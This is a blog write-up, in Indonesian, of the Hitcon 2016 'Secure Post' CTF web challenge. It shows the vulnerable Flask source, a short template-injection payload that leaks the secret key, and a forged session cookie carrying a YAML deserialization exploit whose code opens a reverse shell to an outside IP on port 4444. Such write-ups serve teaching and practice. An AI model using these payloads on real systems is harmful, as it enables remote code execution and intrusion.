---
layout: post
title: "Hitcon 2016 : Secure Post"
description: "Hitcon 2016 : Secure Post"
headline: 
modified: 2016-10-10
category: Hitcon 2016
tags: [Hitcon 2016]
imagefeature: /images/php.jpg
mathjax: 
chart: 
comments: true
featured: true
---

### Problem :

Here is a service that you can store any posts. Can you hack it?
http://52.198.91.29/

### Solution : 

Di berikan web service dengan flask. dan kita bisa mengakses source code nya di `http://52.198.91.29/source`

```python

from flask import Flask
import config

# init app
app = Flask(__name__)
app.secret_key = config.flag1
accept_datatype = ['json', 'yaml']

from flask import Response
from flask import request, session
from flask import redirect, url_for, safe_join, abort
from flask import render_template_string

# load utils
def load_eval(data):
    return eval(data)

def load_pickle(data):
    import pickle
    return pickle.loads(data)

def load_json(data):
    import json
    return json.loads(data)

def load_yaml(data):
    import yaml
    return yaml.load(data)

# dump utils
def dump_eval(data):
    return repr(data)

def dump_pickle(data):
    import pickle
    return pickle.dumps(data)

def dump_json(data):
    import json
    return json.dumps(data)

def dump_yaml(data):
    import yaml
    return yaml.dump(data)


def render_template(filename, **args):
    with open(safe_join(app.template_folder, filename)) as f:
        template = f.read()
    name = session.get('name', 'anonymous')[:10]
    return render_template_string(template.format(name=name), **args)

def load_posts():
    handlers = {
        # disabled insecure data type
        #"eval": load_eval,
        #"pickle": load_pickle,

        "json": load_json,
        "yaml": load_yaml
    }

    datatype = session.get("post_type", config.default_datatype)
    data = session.get("post_data", config.default_data)

    if datatype not in handlers: abort(403)
    return handlers[datatype](data)

def store_posts(posts, datatype):
    handlers = {
        "eval": dump_eval,
        "pickle": dump_pickle,

        "json": dump_json,
        "yaml": dump_yaml
    }
    if datatype not in handlers: abort(403)
    data = handlers[datatype](posts)

    session["post_type"] = datatype
    session["post_data"] = data


@app.route('/')
def index():
    posts = load_posts()
    return render_template('index.html', posts = posts, accept_datatype = accept_datatype)

@app.route('/post', methods=['POST'])
def add_post():
    posts = load_posts()

    title = request.form.get('title', 'empty')
    content = request.form.get('content', 'empty')
    datatype = request.form.get('datatype', 'json')
    if datatype not in accept_datatype: abort(403)
    name = request.form.get('author', 'anonymous')[:10]

    from datetime import datetime
    posts.append({
        'title': title,
        'author': name,
        'content': content,
        'date': datetime.now().strftime("%B %d, %Y %X")
    })
    session["name"] = name
    store_posts(posts, datatype)
    return redirect(url_for('index'))

@app.route('/source')
def get_source():
    with open(__file__, "r") as f:
        resp = f.read()
    return Response(resp, mimetype="text/plain")

```


### Secure Post 

pada fungsi `add_post` terlihat bahwa author name yang kita input akan di simpan ke dalam session.
`session["name"] = name` dan pada fungsi `render_template` session kita di ambil 10 karakter pertamanya
`name = session.get('name', 'anonymous')[:10]`. kemungkinan kita bisa melakukan template string injection.
namun kita tidak bisa menggunakan payload yang lebih dari 10 karakter awalnya kita coba `{{config.items()}}`
tapi tidak menghasilkan apa karena > 10 karakter. dan setelah beberapa lama akhirnya di temukan flag dengan `{{config}}`
pas 10 karakter. 

```html
<p class="lead blog-description"><Config {'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_PATH': None, 'TRAP_HTTP_EXCEPTIONS': False, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_DOMAIN': None, 'USE_X_SENDFILE': False, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': 43200, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SESSION_COOKIE_HTTPONLY': True, 'SERVER_NAME': None, 'APPLICATION_ROOT': None, 'DEBUG': False, 'JSON_AS_ASCII': True, 'TESTING': False, 'JSONIFY_PRETTYPRINT_REGULAR': True, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'JSON_SORT_KEYS': True, 'LOGGER_NAME': 'post_manager', 'PREFERRED_URL_SCHEME': 'http', 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': 'hitcon{>_<---Do-you-know-<script>alert(1)</script>-is-very-fun?}', 'TRAP_BAD_REQUEST_ERRORS': False}>
```

### Secure Post 2

ada 2 fungsi yang menarik `store_posts` dan `load_posts` awalnya saya kira `eval` dan `pickle` 
bisa di manfaatkan dalam hal ini untuk membantu melakukan RCE. tapi setelah di lihat lagi kodenya 
memiliki beberapa checking yang sangat strict terhadap `eval` dan `pickle` 

pengecekan di sini `accept_datatype = ['json', 'yaml']` dan `load_posts` di comments
dan beberapa handlers seperti ini `if datatype not in handlers: abort(403)`
sehingga kita mustahil untuk memanfaatkan itu.

ternyata `YAML` sifatnya pun sama dengan pickle ketika melakukan unserialize
tapi untuk melakukan injeksi kita tidak bisa langsung melakukan via `add_post`
kita injeksi langsung ke dalam session flask tersebut. di website nya juga ada 
pesan `Data is not stored in database`. jadi post kita di simpan di dalam session Flask

tapi flask itu melakukan signed sama cookie nya jadi kita ngak bisa 
langsung rubah. untuk itu saya simulasikan dengan `secret_key` yang sama
untuk generate cookie payload yang kita inginkan

```python

class Exploit(object):
 def __reduce__(self):
   fd = 1
   return (exec,
           ('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("128.199.226.218",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);',))
   

# dump utils
@app.route('/')
def index():
    anu = yaml.dump(Exploit())
    serializer_interface = SecureCookieSessionInterface()
    serializer = serializer_interface.get_signing_serializer(app)
    out = serializer.dumps({
    "name": "shit",
    "post_data": "- "+anu,
    "post_type": "yaml"
})

    print(out)
    return render_template('index.html', out=out)

```

kemudian kita injeksikan session payload ke web tersebut. sebelumnya
kita nyalakan listening pada server kita misalnya port: 4444 seperti
dalam exploit di atas.

[![asciicast](https://asciinema.org/a/6khdwmh6c607znru18kahziij.png)](https://asciinema.org/a/6khdwmh6c607znru18kahziij)

Flag : `hitcon{unseriliaze_is_dangerous_but_RCE_is_fun!!}`